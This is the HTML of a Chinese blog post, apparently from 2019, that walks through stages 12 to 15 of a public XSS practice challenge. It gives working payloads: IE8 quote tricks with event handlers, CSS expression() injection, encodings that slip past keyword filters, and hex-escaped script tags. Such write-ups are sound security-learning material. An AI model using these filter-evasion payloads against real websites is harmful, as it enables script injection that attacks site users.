@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>XSS challengs 12-15 通关记录 | Joner的博客</title>
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class="SideBar">
+    <section class="avatar" style="background-image: url()">
+        <div class="av-pic" style="background-image: url()">
+        </div>
+    </section>
+    <section class="menu">
+        <div>Joner的博客</div>
+        
+            <div>通透</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class="ContentView">
+    <header class="PageTitle">
+        <h1>XSS challengs 12-15 通关记录</h1>
+    </header>
+
+    <section>
+      <p>下面记录的是 XSS challenges stage 12-15关的通关过程，主要涉及IE8 的一些内容和行内样式注入，其中有一些查了网上的资料才做出来，还有两个实际是没有做出来的，这里先记录下来，等有时间再继续研究。</p>
+<a id="more"></a>
+<h2 id="stage-12"><a href="#stage-12" class="headerlink" title="stage #12"></a><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=b23f6debebc8e29a75745eac6158b4340276a7d9" target="_blank" rel="noopener">stage #12</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入<code>&quot;&lt;script&gt;alert(&quot;ss&quot;)&lt;/script&gt;</code>之后发现回显的结果中双引号和<code>&lt;&gt;</code>没有了，所以推测过滤了这两个符号，这里用到的知识是</p>
+<blockquote>
+<p>在IE8中会把<code></code>识别为双引号</p>
+</blockquote>
+<p>所以设置windows自带浏览器兼容性设置，使用IE8打开这一关的网页，然后在搜索框中输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmousemove=alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
+<p>移动鼠标后出现弹窗，获得下一关的地址。</p>
+<h2 id="stage-13"><a href="#stage-13" class="headerlink" title="stage  #13"></a><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=a3fab86d8417196bc1c9214ab00422c9892c2698" target="_blank" rel="noopener">stage  #13</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"60"</span> <span class="attr">style</span>=<span class="string">"background-color:salmon"</span> <span class="attr">value</span>=<span class="string">"background-color:salmon"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现里里面有个<code>style</code>样式，利用行内样式的动态属性进行xss</p>
+<blockquote>
+<p><em>行内样式</em></p>
+<p>我们同样可以在行内样式里利用IE浏览器支持的动态特性:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression(alert("</span><span class="attr">sss</span>"))"&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>过滤器会检查关键字<code>style</code>，随后跟随的不能是&lt;，在随后是<code>expression/style=[^&lt;]*((ecpression\s*?[&gt;]*?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis</code>所以需要把&lt;放到其他地方：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:'&lt;';color:expression(alert("</span><span class="attr">sss</span>"))"&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+</blockquote>
+<p>插入代码</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expression(onmousemove=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
+<p>这个没搞出来</p>
+<h2 id="stage-14"><a href="#stage-14" class="headerlink" title="stage #14"></a><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=0ccb3bac891178e3bd1966b5624529302f5efcf0" target="_blank" rel="noopener">stage #14</a></h2><p>安装上面一关的方法，在文本框中输入以下语句</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:expression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
+<p>提交后</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:xxx(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
+<p>expression被处理成了xxx，推测有正则过滤</p>
+<p>有四种方法来绕过过滤</p>
+<ul>
+<li>e -&gt; \0065 </li>
+<li>加入\隔断</li>
+<li>加入\0隔断</li>
+<li>加入/**/隔断</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aa:\0065 xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e\xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e\0xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e/**/xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="stage-15"><a href="#stage-15" class="headerlink" title="stage #15"></a><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=5fb4fd17e95ff1b2104b179a9a49d173d8597681" target="_blank" rel="noopener">stage #15</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"123"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11";<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"sss"</span>)</span></span><br></pre></td></tr></table></figure>
+<p>提交后查看结果发现一些字符被转换了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"11&amp;quot;;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;sss&amp;quot;)"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">变成了&amp;lt;</span></span></span><br><span class="line"><span class="tag">&gt;</span>变成了&amp;gt;</span><br><span class="line">怎么绕过<span class="tag">&lt;<span class="name">和</span>&gt;</span>呢？</span><br><span class="line">16进制编码：</span><br><span class="line"><span class="tag">&lt; 变成了 \<span class="attr">x3c</span> </span></span><br><span class="line"><span class="tag">&gt;</span> 变成了 \x3e</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x3cscript\x3ealert(document.domain);\x3c/script\x3e #这个不行，应该是过滤了单个 \</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e #获得下一关地址</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="https://blog.csdn.net/emaste_r/article/details/16988167" target="_blank" rel="noopener">2013 XSS Challenges Stage 解题报告</a></p>
+</blockquote>
+
+
+      
+
+    </section>
+    
+      <section class="ArticleMeta">
+          <div>
+            发布于&nbsp;
+            <time datetime="2019-04-02T15:49:43.000Z" itemprop="datePublished">
+              2019-04-02
+            </time>
+          </div>
+          
+            <div>
+              tags: 
+  <li class="meta-text">
+  { <a href="/tags/XSS/">XSS</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/XSS-challenges/">XSS challenges</a> }
+  </li>
+
+
+            </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2019 - Joner </div>
+    <div>
+        <span>
+            Powered by <a href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
